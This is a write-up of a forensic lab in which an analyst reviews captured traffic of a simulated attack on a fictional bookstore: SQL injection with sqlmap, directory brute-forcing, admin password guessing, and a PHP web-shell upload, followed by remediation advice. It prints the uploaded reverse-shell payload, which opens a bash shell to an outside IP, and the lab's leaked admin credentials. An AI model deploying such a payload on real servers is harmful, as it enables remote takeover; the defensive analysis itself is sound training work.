---
cover: ../../.gitbook/assets/download (2).jpeg
coverY: 0
---

# Web Investigation Lab

## Senario :&#x20;

You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.

Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.

As the lead analyst on this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

***

**First, I opened the PCAP file and applied an HTTP protocol filter. During my analysis, I observed that the user with the IP address (**<mark style="color:red;">**111.224.250.131**</mark>**) was performing malicious SQL injection attacks on the search input field.**&#x20;



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 130535.png" alt=""><figcaption></figcaption></figure>

By analyzing the requests, it was determined that an automation tool like **SQLMAP** is being used to exploit **SQL Injection** vulnerabilities.

**SQLMAP** is an open-source tool used to detect and exploit **SQL Injection** vulnerabilities in web applications. It allows data extraction, command execution on databases, and supports various types of SQL Injection, such as **Union-based** and **Blind SQL Injection**. These capabilities make it a powerful tool for penetration testers during security assessments.

**Reference :** [https://sqlmap.org/](https://sqlmap.org/)



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 131544.png" alt=""><figcaption></figcaption></figure>

During my analysis of the requests and responses related to the **SQLMAP** tool, I found that the tool successfully exploited an **SQL Injection** vulnerability. It was able to list the names of databases and retrieve all the databases present on the server.

The concerning part is that the databases were stored in **clear text**, not encrypted.

Notably, the **Username** and **Passwords** for the **Admin** account, along with details of all site users, were exposed, providing the attacker full access to the website's contents.

The names of the databases found are: <mark style="color:green;">\["mysql", "information\_schema", "performance\_schema", "sys", "bookworld\_db"]</mark>&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20250112160237.png" alt=""><figcaption></figcaption></figure>

The tables present in the **INFORMATION\_SCHEMA** database are: <mark style="color:green;">\["admin", "books", "customers"]</mark>

The **admin** table contains the following columns: <mark style="color:green;">\["idzvgjckint", "passwordzvgjckvarchar(255)", "usernamezvgjckvarchar(255)"]</mark> It holds **ID**, **Password**, and **Username**.

The **Admin** account's username and password are: <mark style="color:green;">\["1zvgjckadmin123!zvgjckadmin"]</mark>

Once the attacker gained access to the database, they started attempting to discover the **web application's directories/files** or any sensitive pages, such as the **Admin** page.



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 131651.png" alt=""><figcaption></figcaption></figure>

After investigating the requests, it was found that the attacker is using the **Gobuster** tool, which is similar to the **ffuf** tool.

**Gobuster** is an open-source tool designed to discover hidden files, directories, and subdomains on web servers by performing brute force attacks using a wordlist. Written in **Go**, it offers high speed and efficiency, making it ideal for penetration testing and cybersecurity research. **Gobuster** supports various modes, including directory brute-forcing, DNS subdomain enumeration, and virtual host discovery. Its ability to customize extensions, handle authentication, and integrate with proxies makes it a versatile and powerful tool for uncovering misconfigurations and sensitive resources.

**Reference :** [https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 132823.png" alt=""><figcaption></figcaption></figure>

Some of the **responses** returned errors such as **404 Not Found**, **403 Forbidden**, and **301 Moved Permanently**.

However, the result was that the tool was able to identify active **files** and **paths**, such as **/admin/login.php**.



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 134119.png" alt=""><figcaption></figcaption></figure>

&#x20;After that, the attacker started attempting to log in using the **Admin** account with <mark style="color:green;">**username**</mark> <mark style="color:green;"></mark><mark style="color:green;">=</mark> <mark style="color:green;"></mark><mark style="color:green;">**admin**</mark> and <mark style="color:green;">**password**</mark> <mark style="color:green;"></mark><mark style="color:green;">=</mark> <mark style="color:green;"></mark><mark style="color:green;">**admin**</mark>.





<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 134029.png" alt=""><figcaption></figcaption></figure>

However, the login credentials were incorrect, as seen in the **response**.&#x20;



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 134056.png" alt=""><figcaption></figcaption></figure>

In the next **request**, the attacker tried a different **password**, with <mark style="color:green;">**username**</mark> <mark style="color:green;"></mark><mark style="color:green;">=</mark> <mark style="color:green;"></mark><mark style="color:green;">**admin**</mark> and <mark style="color:green;">**password**</mark> <mark style="color:green;"></mark><mark style="color:green;">=</mark> <mark style="color:green;"></mark><mark style="color:green;">**changeme**</mark>, but there was still an error in the login credentials, as seen in the **response**.



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 134955.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 135417.png" alt=""><figcaption></figcaption></figure>

The attacker then tried a different **username** and **password**, such as <mark style="color:green;">**username**</mark> <mark style="color:green;"></mark><mark style="color:green;">=</mark> <mark style="color:green;"></mark><mark style="color:green;">**default**</mark> and <mark style="color:green;">**password**</mark> <mark style="color:green;"></mark><mark style="color:green;">=</mark> <mark style="color:green;"></mark><mark style="color:green;">**default**</mark>, but there was still an error in the login credentials.

After that, the attacker used <mark style="color:blue;">**username**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">=</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**admin**</mark> and <mark style="color:blue;">**password**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">=</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**admin123!**</mark>. This time, the credentials were correct, and the website performed a **redirection** to the **Admin** page.



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 141051.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 141106.png" alt=""><figcaption></figcaption></figure>

**Now, I will explain in detail what happened in the previous two images.**

## What happened in detail?

#### **Step 1: Login Request**

1. **Request Details:**
   * A `POST` request is made to `/admin/login.php` to submit login credentials: `username=admin&password=admin123%21`
     * The password includes a special character (`!`), which is encoded as `%21`.
   * The request headers include:
     * `Content-Type`: Indicates the data format (`application/x-www-form-urlencoded`).
     * `Referer`: Shows the request originated from `/admin/login.php`.
     * A session cookie (`PHPSESSID`) is attached to track the user session.
2. **Server Response:**
   * The server responds with a `302 Found` status, signaling a successful login.
   * **Redirect Instruction:** The `Location` header directs the client to `/admin/index.php`.
   * **Cache Control:** The response ensures no caching via `no-store, no-cache, must-revalidate`.

***

#### **Step 2: Redirect to Admin Dashboard**

1. **Request Details:**
   * After receiving the redirect, the client sends a `GET` request to `/admin/index.php`.
   * The same session cookie (`PHPSESSID`) is used to authenticate the request.
   * The `Referer` header indicates that the request originated from `/admin/login.php`.
2. **Server Response:**
   * The server responds with `200 OK`, confirming successful access to the protected page.
   * **Content:** The response contains the HTML for the Admin Dashboard, including:
     * **Title:** "Admin Dashboard".
     * **Message:** `Welcome to the Admin Dashboard. This is a protected area only accessible by authenticated users.`

#### **Summary**

1. The user logs in successfully by submitting their credentials via `POST`.
2. The server validates the credentials and redirects to the admin dashboard (`302 Found`).
3. The client follows the redirect and successfully accesses the dashboard (`200 OK`) as an authenticated user.

After the attacker gained **Admin** privileges, they started uploading a **PHP** file to the server, which could potentially be a **Backdoor**.

I will start investigating the **request** and examining its details.



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 145236.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 150530.png" alt=""><figcaption></figcaption></figure>

#### HTTP Request Breakdown:

* **Method**: `POST`\
  This means that data is being sent to the server (in this case, the server is receiving the file data).
* **URL**: `/admin/index.php`\
  The target of the request is the `index.php` page within the `/admin` directory of the website `bookworldstore.com`.
* **Headers**:
  * **Host**: `bookworldstore.com`\
    Specifies the domain to which the request is being sent.
  * **User-Agent**: A Mozilla-based browser on Linux, indicating the type of client making the request.
  * **Content-Type**: `multipart/form-data`\
    Indicates that the request body contains a file upload. This is common when submitting forms with files.
  * **Content-Length**: 441\
    The size of the request body, including the file being uploaded.
  * **Origin** and **Referer**: `http://bookworldstore.com`\
    Specifies the origin and referring page of the request, which is from within the website's admin panel.
  * **Cookie**: `PHPSESSID=ae7mvmmf2krhir4kngnmio680a`\
    The session cookie, which is likely used to maintain the user's session after logging in.
  * **Upgrade-Insecure-Requests**: 1\
    This is used to indicate that the browser prefers to upgrade to HTTPS if the resource is available.

#### Request Body (Multipart Form Data):

*   **First part**: Contains the uploaded file

    * `Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"`\
      The file being uploaded is named `NVri2vhp.php`, and it is of type `application/x-php` (indicating that it's a PHP file).
    *   The file content:

        `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>`

        This PHP code is attempting to initiate a reverse shell connection to an external IP address (`111.224.250.131`) on port 443. If this code executes successfully on the server, it could allow the attacker to remotely control the server.

    ## SUMMARY:

    This request is likely part of an attempt to exploit a vulnerability in the file upload functionality of the admin panel. The attacker aims to upload a PHP shell that would allow them to establish a reverse shell connection and execute arbitrary commands on the server. Proper validation and security measures (like checking the file type, sanitizing inputs, or limiting executable file uploads) are essential to prevent such attacks.

Later, in the **response**, I discovered that the file was uploaded without the server performing any check on the uploaded file, which indicates a problem with **file upload** .



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 151055.png" alt=""><figcaption></figcaption></figure>

After that, the attacker attempted to execute the file they uploaded, but the server did not execute the file and returned a **500 error**.



<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 151725.png" alt=""><figcaption></figcaption></figure>

#### **Analysis**:

1. **Attempt to Execute a Malicious PHP File**:
   * The `GET` request was intended to execute the file `NVri2vhp.php`, which contains a reverse shell payload.
   * The `500 Internal Server Error` response indicates that the server failed to execute the file.
2. **Possible Reasons for the Error**:
   * **Insufficient Permissions**: The file `NVri2vhp.php` may lack the necessary permissions for execution.
   * **Execution Disabled in Upload Directory**: The server may be configured to prevent PHP execution in the `uploads` directory.
   * **Code Issue**: The payload inside the file might have an error preventing it from executing correctly.
   * **Security Mechanisms**: A firewall or security tool (e.g., ModSecurity) may have blocked the execution attempt.
3. **Conclusion**:
   * The `GET` request was an attempt to activate a malicious reverse shell file.
   * The `500 Internal Server Error` response suggests that the attempt failed due to a server-side issue, either technical or because of implemented security measures.

**To prevent similar attacks from happening again, here are some essential security measures:**

#### 1. **Input Validation & Sanitization**:

* **SQL Injection Protection**: Use **prepared statements** (with parameterized queries) and **stored procedures** to prevent SQL injection attacks. Avoid dynamic SQL queries.
* **Sanitize User Inputs**: Ensure all input fields (e.g., search forms, login forms) properly validate user input. For example, using functions to sanitize and validate inputs to prevent malicious scripts or SQL commands.

#### 2. **Use Web Application Firewalls (WAF)**:

* A **WAF** can help detect and block malicious requests like SQL injection and file upload attacks.
* Configure the WAF to recognize and block **SQLMAP**-like automated tools or other suspicious activity patterns.

#### 3. **Limit File Uploads**:

* **Validate File Types**: Only allow specific file types to be uploaded (e.g., image formats). Reject any executable files or scripts.
* **Restrict File Size**: Limit the maximum file size for uploads to reduce the risk of malicious payloads.
* **Sanitize File Names**: Rename uploaded files to prevent any malicious or unexpected behavior (e.g., remove special characters).

#### 4. **File Execution Restrictions**:

* **Disable PHP Execution**: If file uploads are necessary, ensure that uploaded files cannot be executed. Configure the server to **disable PHP execution** in the upload directory.
* **Place Uploads in a Non-Executable Directory**: Ensure uploaded files are stored in a directory that does not allow script execution.

#### 5. **Use Strong Authentication**:

* Ensure **strong password policies** are enforced for all accounts, especially administrative accounts.
* Implement **multi-factor authentication (MFA)** for administrative logins to add an additional layer of security.

#### 6. **Encrypt Sensitive Data**:

* Store passwords and sensitive data securely using strong encryption mechanisms (e.g., bcrypt for passwords).
* Ensure that **database credentials** and sensitive data are never stored in plain text.

#### 7. **Regular Security Audits & Penetration Testing**:

* Regularly perform **security assessments** and **penetration testing** to identify and fix vulnerabilities.
* Use **automated tools** (like SQLMAP) in a controlled environment to check for vulnerabilities before attackers can exploit them.

#### 8. **Patch Management**:

* Keep your web server and software up to date with the latest security patches to close known vulnerabilities.

#### 9. **Logging and Monitoring**:

* Implement **logging and monitoring** of web application traffic and database queries. Monitor for unusual activity like multiple failed login attempts or automated tool usage.
* Set up **alerts** for abnormal patterns or possible attacks.

By implementing these measures, you can significantly reduce the likelihood of SQL injection and file upload vulnerabilities being exploited in your web application.

#### References :

1. **SQL Injection Protection**:
   * OWASP SQL Injection Prevention Cheat Sheet. Available at: [https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
   * OWASP Guide for Prepared Statements. Available at: [https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html#prepared-statements](https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#prepared-statements)
2. **Web Application Firewalls (WAF)**:
   * OWASP ModSecurity Core Rule Set. Available at: [https://github.com/SpiderLabs/owasp-modsecurity-crs](https://github.com/SpiderLabs/owasp-modsecurity-crs)
   * WAF Overview by Cloudflare. Available at: [https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/)
3. **File Upload Security**:
   * OWASP File Upload Cheat Sheet. Available at: [https://cheatsheetseries.owasp.org/cheatsheets/File\_Upload\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
   * OWASP Security for File Upload. Available at: [https://owasp.org/www-project-top-ten/2017/A10\_Insufficient\_Logging\_and\_Monitoring](https://owasp.org/www-project-top-ten/2017/A10_Insufficient_Logging_and_Monitoring)
4. **PHP and Web Security**:
   * PHP Manual on File Uploads. Available at: [https://www.php.net/manual/en/features.file-upload.php](https://www.php.net/manual/en/features.file-upload.php)
   * OWASP Web Security Testing Guide. Available at: [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)
5. **Authentication and Authorization**:
   * OWASP Authentication Cheat Sheet. Available at: [https://cheatsheetseries.owasp.org/cheatsheets/Authentication\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
   * OWASP Guide to Secure Authentication. Available at: [https://owasp.org/www-project-cheat-sheets/cheatsheets/Authentication\_Cheat\_Sheet.html](https://owasp.org/www-project-cheat-sheets/cheatsheets/Authentication_Cheat_Sheet.html)
6. **Encryption and Secure Data Storage**:
   * OWASP Cryptographic Storage Cheat Sheet. Available at: [https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic\_Storage\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
   * OWASP Password Storage Cheat Sheet. Available at: [https://cheatsheetseries.owasp.org/cheatsheets/Password\_Storage\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
7. **Regular Security Audits and Penetration Testing**:
   * OWASP Testing Guide. Available at: [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)
   * OWASP Web Application Security Testing. Available at: [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
8. **Patch Management and Updates**:
   * OWASP Software Component Verification Cheat Sheet. Available at: [https://cheatsheetseries.owasp.org/cheatsheets/Software\_Component\_Verification\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Software_Component_Verification_Cheat_Sheet.html)
9. **Logging and Monitoring**:
   * OWASP Logging Cheat Sheet. Available at: [https://cheatsheetseries.owasp.org/cheatsheets/Logging\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
   * OWASP Guide for Monitoring Security Logs. Available at: [https://owasp.org/www-project-top-ten/2017/A10\_Insufficient\_Logging\_and\_Monitoring](https://owasp.org/www-project-top-ten/2017/A10_Insufficient_Logging_and_Monitoring)
